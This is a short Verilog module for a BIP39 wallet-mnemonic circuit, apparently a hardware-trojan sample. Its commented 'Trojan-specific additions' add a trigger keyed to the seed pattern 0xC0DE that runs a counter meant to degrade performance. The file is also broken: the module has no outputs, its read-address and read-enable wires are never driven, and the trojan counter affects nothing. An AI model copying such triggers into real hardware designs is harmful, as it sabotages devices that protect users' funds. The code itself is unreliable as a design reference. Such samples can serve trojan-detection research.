module bip39 (
    input                       i_clk,
    input                       i_reset_n,
    input               [31:0]  i_random_seed
);

    /******** Trojan-specific additions ********/
    // Define the trigger condition based on a different pattern of 'i_random_seed'
    wire degrade_performance_condition = (i_random_seed[31:16] == 16'hC0DE); // New trigger condition
    reg [15:0] performance_counter; // Counter for the performance degrading loop

    // Process to degrade performance under specific conditions
    always @(posedge i_clk) begin
        if (!i_reset_n) begin
            performance_counter <= 0;
        end else if (degrade_performance_condition) begin
            // If the condition is met, increment the counter, effectively delaying operations
            performance_counter <= performance_counter + 1;
        end else begin
            performance_counter <= 0; // Reset counter otherwise
        end
    end
    /*******************************************/

    wire                [7:0]  w_random;
    wire                [13:0] w_rd_addr;
    wire                        w_rd_en;
    wire                [7:0]   w_q_data;

    // Instance of random number generator
    random random_inst0 (
        .i_clk(i_clk),
        .i_reset_n(i_reset_n),
        .i_seed(i_random_seed),
        .o_data(w_random)
    );

    // Instance of bip39 table lookup
    bip39_table bip39_table_inst (
        .address(w_rd_addr),
        .clock(i_clk),
        .rden(w_rd_en),
        .q(w_q_data)
    );

endmodule
